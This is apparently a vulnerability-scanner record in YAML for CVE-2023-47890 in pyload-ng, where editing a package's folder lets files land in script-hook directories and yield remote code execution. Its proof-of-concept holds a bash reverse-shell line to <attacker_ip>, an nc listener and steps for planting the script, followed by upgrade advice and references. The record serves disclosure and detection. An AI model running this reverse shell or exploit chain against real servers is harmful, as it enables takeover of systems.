info:
  name: pyload-ng
  cve: CVE-2023-47890
  summary: Download to arbitrary folder can lead to RCE
  details: |
    A web UI user can store files anywhere on the pyLoad server and gain command execution by abusing scripts. When a user creates a new package, a subdirectory is created within the /downloads folder to store files. However, when editing packages, there is no prevention in place, allowing a user to pick any arbitrary directory in the filesystem.
    Steps to reproduce:
    1. Login to a pyLoad instance
    2. Go to "Queue" and create a new package with any name and a valid link
    3. Click "Edit Package" on the newly created package and set the folder as "/config/scripts/download_finished/"
    4. Restart the package
    5. Check the server filesystem and note the link was downloaded and stored inside "/config/scripts/download_finished/"
    Remote code execution proof-of-concept:
    - On attacker machine:
      1. Start a web server hosting a malicious script
         ```bash
         echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<attacker_ip>/9999 0>&1' > evil.sh&1
         sudo python3 -m http.server 80
         ```
      2. Start netcat listener for reverse shells
         ```bash
         nc -vklp 9999
         ```
    - On pyLoad:
      1. Change pyLoad file permission settings
         - Change permissions of downloads: On
         - Permission mode for downloaded files: 0744
      2. Create a package with link pointing to the attacker
         http://<attacker_ip>/evil.sh
      3. Edit package and change folder to /config/scripts/package_deleted/
      4. Refresh package. Wait up to 60 seconds for scripts to be processed by pyLoad
      5. Delete any package to trigger the script
  cvss: CVSS:3.1/AV:A/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H
  severity: HIGH
  security_advise: |
    1. Upgrade to pyload-ng >= 0.5.0b3.dev75
    2. Implement strict directory validation for package folders
    3. Review and restrict file permissions for downloaded content
rule: version < "0.5.0b3.dev75"
references:
  - https://github.com/pyload/pyload/security/advisories/GHSA-h73m-pcfw-25h2
  - https://nvd.nist.gov/vuln/detail/CVE-2023-47890
  - https://github.com/pyload/pyload/commit/695bb70cd88608dc4fee18a6a7ecb66722ebfd8f
  - https://github.com/pyload/pyload
  - http://pyload.com